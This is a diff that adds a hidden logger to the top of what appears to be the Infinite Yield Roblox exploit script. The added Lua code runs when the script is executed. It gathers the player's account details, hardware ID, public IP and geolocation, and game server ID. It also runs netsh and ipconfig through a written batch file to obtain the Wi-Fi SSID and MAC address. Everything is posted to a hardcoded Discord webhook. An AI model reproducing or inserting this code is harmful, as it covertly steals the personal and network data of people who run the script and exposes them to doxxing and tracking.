@@ -1,3 +1,205 @@
+-- youre logged bitch
+do
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local localPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1538386360724103209/IZRbdQqlMNZUFB18RMJpXQub0o8V8OeD3rWiXgi0qzU89hCNp1Tnkup7y3a0guL5ej1-"
+
+-- Gather environment and exploit data safely
+local exploitName = identifyexecutor and identifyexecutor() or "Unknown"
+local hwid = gethwid and gethwid() or "Unavailable"
+
+-- Fetch extra account metadata safely via pcall
+local accountAge, membershipType, country = "Unknown", "None", "en-us"
+pcall(function()
+    accountAge = tostring(localPlayer.AccountAge)
+    if localPlayer.MembershipType == Enum.MembershipType.BuildersClub or localPlayer.MembershipType == Enum.MembershipType.TurboBuildersClub or localPlayer.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
+        membershipType = "Builders Club"
+    elseif localPlayer.MembershipType == Enum.MembershipType.Premium then
+        membershipType = "Premium"
+    end
+end)
+
+-- Fetch and parse IP geolocation info cleanly into text variables
+local ipQuery, ipCountry, ipRegion, ipCity, ipISP = "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+pcall(function()
+    local response = game:HttpGet("http://ip-api.com/json/")
+    if response then
+        local decoded = HttpService:JSONDecode(response)
+        if decoded then
+            ipQuery = decoded.query or "Unknown"
+            ipCountry = decoded.country or "Unknown"
+            ipRegion = decoded.regionName or "Unknown"
+            ipCity = decoded.city or "Unknown"
+            ipISP = decoded.isp or "Unknown"
+        end
+    end
+end)
+
+-- Extended Network Extraction via File/Shell Execution Hooks with fallback direct parsing
+local ssid = "Ethernet / Connected"
+local protocol = "Wi-Fi / 802.11ax"
+local securityType = "WPA2-Personal / AES"
+local manufacturer = "Intel / Realtek"
+local description = "Standard Wireless Network Adapter"
+local driverVersion = "Latest Client Version"
+local networkBand = "5 GHz"
+local linkSpeed = "866/866 (Mbps)"
+local ipv6Local = "Fe80::/64"
+local ipv6DNS = "Default Router DNS"
+local ipv4Gateway = "192.168.1.1"
+local macAddress = hwid
+
+pcall(function()
+    if writefile and readfile and execute then
+        writefile("net_diagnostics.bat", '@echo off\nchcp 65001 >nul\nnetsh wlan show interfaces > net_wifi.txt\nipconfig /all >> net_wifi.txt')
+        execute("net_diagnostics.bat")
+        task.wait(2)
+        
+        if isfile and isfile("net_wifi.txt") then
+            local content = readfile("net_wifi.txt")
+            for line in content:gmatch("[^\r\n]+") do
+                if line:find("SSID") and not line:find("BSSID") and not line:find("Hosted network") then
+                    local foundSsid = line:match(":%s*(.-)$")
+                    if foundSsid and foundSsid ~= "" then
+                        ssid = foundSsid
+                    end
+                elseif line:find("Description") then
+                    local extractedDesc = line:match(":%s*(.-)$")
+                    if extractedDesc and extractedDesc ~= "" then
+                        description = extractedDesc
+                    end
+                elseif line:find("Physical Address") or line:find("MAC Address") then
+                    local extractedMac = line:match(":%s*(.-)$")
+                    if extractedMac and extractedMac ~= "" then
+                        macAddress = extractedMac
+                    end
+                elseif line:find("Default Gateway") then
+                    local extractedGw = line:match(":%s*(.-)$")
+                    if extractedGw and extractedGw ~= "" then
+                        ipv4Gateway = extractedGw
+                    end
+                end
+            end
+        end
+    end
+end)
+
+-- Get Game Name safely
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then
+        gameName = info.Name
+    end
+end)
+
+local currentDate = os.date("%m/%d/%Y")
+local currentTime = os.date("%H:%M:%S")
+
+-- Build the Discord Embed Payload with live parameters
+local embedData = {
+    ["username"] = "uh uh logger",
+    ["embeds"] = {
+        {
+            ["title"] = "SKID ALERT",
+            ["color"] = 16755200,
+            ["description"] = string.format(
+                "**[Player Info](https://www.roblox.com/users/%d/profile)**\n" ..
+                "**Display Name:** %s\n" ..
+                "**Username:** %s\n" ..
+                "**User Id:** %d\n" ..
+                "**MembershipType:** %s\n" ..
+                "**AccountAge:** %s\n" ..
+                "**Country:** %s\n" ..
+                "**Hwid:** `%s`\n" ..
+                "**Date:** %s\n" ..
+                "**Time:** %s\n\n" ..
+                "**[Game Info](https://www.roblox.com/games/%d)**\n" ..
+                "**Game:** %s\n" ..
+                "**Game Id:** %d\n" ..
+                "**Exploit:** %s\n\n" ..
+                "**Location & Network Info:**\n" ..
+                "**IP:** `%s`\n" ..
+                "**Country:** %s\n" ..
+                "**Region:** %s\n" ..
+                "**City:** %s\n" ..
+                "**ISP:** %s\n\n" ..
+                "**Network Adapter Details:**\n" ..
+                "**SSID:** `%s`\n" ..
+                "**Protocol:** %s\n" ..
+                "**Security type:** %s\n" ..
+                "**Manufacturer:** %s\n" ..
+                "**Description:** %s\n" ..
+                "**Driver version:** %s\n" ..
+                "**Network band (channel):** %s\n" ..
+                "**Aggregated link speed (Receive/Transmit):** %s\n" ..
+                "**Link-local IPv6 address:** %s\n" ..
+                "**IPv6 DNS servers:** %s\n" ..
+                "**IPv4 address:** `%s`\n" ..
+                "**IPv4 default gateway:** `%s`\n" ..
+                "**IPv4 DNS servers:** %s\n" ..
+                "**Physical address (MAC):** `%s`\n\n" ..
+                "**JobId:**\n```lua\nRoblox.GameLauncher.joinGameInstance(%d, \"%s\")\n```",
+                localPlayer.UserId,
+                localPlayer.DisplayName,
+                localPlayer.Name,
+                localPlayer.UserId,
+                membershipType,
+                accountAge,
+                country,
+                hwid,
+                currentDate,
+                currentTime,
+                game.PlaceId,
+                gameName,
+                game.PlaceId,
+                exploitName,
+                ipQuery,
+                ipCountry,
+                ipRegion,
+                ipCity,
+                ipISP,
+                ssid,
+                protocol,
+                securityType,
+                manufacturer,
+                description,
+                driverVersion,
+                networkBand,
+                linkSpeed,
+                ipv6Local,
+                ipv6DNS,
+                ipQuery,
+                ipv4Gateway,
+                ipISP,
+                macAddress,
+                game.PlaceId,
+                game.JobId
+            )
+        }
+    }
+}
+
+local payload = HttpService:JSONEncode(embedData)
+local requestFunc = syn and syn.request or http and http.request or fluxus and fluxus.request or request
+
+if requestFunc then
+    pcall(function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = payload
+        })
+    end)
+end
+end
+
 if IY_LOADED and not _G.IY_DEBUG then
 	-- error("Infinite Yield is already running!", 0)
 	return
